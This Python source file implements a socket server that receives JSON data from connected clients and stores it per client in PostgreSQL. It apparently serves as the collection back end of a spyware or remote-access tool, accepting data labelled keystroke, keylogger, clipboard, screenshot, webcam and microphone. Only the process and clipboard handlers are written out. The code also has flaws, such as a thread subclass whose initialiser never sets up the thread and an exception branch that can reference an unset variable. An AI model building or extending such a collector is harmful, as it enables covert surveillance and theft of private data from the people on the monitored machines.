import socket
import threading
import json
from host.components.terminalStyles import *
from database.DataManager import PostgreSQLDataManager

class TransmitServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.host, self.port))

    def start(self):
        self.socket.listen(5)
        header(name="Transmitter", message="Waiting for clients...")

        while True:
            try:
                client, addr = self.socket.accept()
                self.clients[addr[0]] = client
                header(name="Transmitter", message=f"Connection established with {addr[0]}")

                client_handler = TransmitHandler(client)
                client_handler.start()

            except Exception as e:
                self.clients.pop(addr[0])

class TransmitHandler(threading.Thread):
    def __init__(self, socket):
        self.socket = socket
        Database = PostgreSQLDataManager()
        self.client_id = Database.get_client_id(socket.getpeername()[0])
        Database.close_connection()
        
        self.data_handler = DataHandler(self.client_id)
        self.run()

    def run(self):
        header(name="Transmitter", message=f"Handling client {self.socket.getpeername()}")

        while True:
            data = self.socket.recv(1024)
            if not data:
                break  # Connection closed
          

            decoded_data = data.decode()
            self.data_manager(decoded_data)

        self.socket.close()
        header(name="Transmitter", message=f"Connection closed with {self.socket.getpeername()}")

    def data_manager(self, data):
        if data:
            try:
                JSON = json.loads(str(data))
                if JSON["type"] == "information" and JSON["part"] in json_parts:
                    self.data_handler.handle_data(JSON)
            except Exception as e:
                error(name="Transmitter", message=f"Error handling data: {str(e)}")

json_parts = ["process", "window", "clipboard", "keystroke", "file", "screenshot", "webcam", "microphone", "keylogger", "realtime"]

class DataHandler:
    def __init__(self, client_id):
        self.client_id = client_id

    def handle_data(self, data):
        if data["part"] == "process":
            self.handle_process_data(data)
        elif data["part"] == "window":
            self.handle_window_data(data)
        elif data["part"] == "clipboard":
            self.handle_clipboard_data(data)
        # Add more data part handlers as needed

    def handle_process_data(self, data):
        DataManager = PostgreSQLDataManager()
        del data["client_id"]
        
        DataManager.add_log(json.dumps(data), self.client_id)
        DataManager.close_connection()

    def handle_window_data(self, data):
        # Handle window data here
        pass

    def handle_clipboard_data(self, data):
        DataManager = PostgreSQLDataManager()
        del data["client_id"]

        DataManager.add_log(json.dumps(data), self.client_id)
        DataManager.close_connection()
        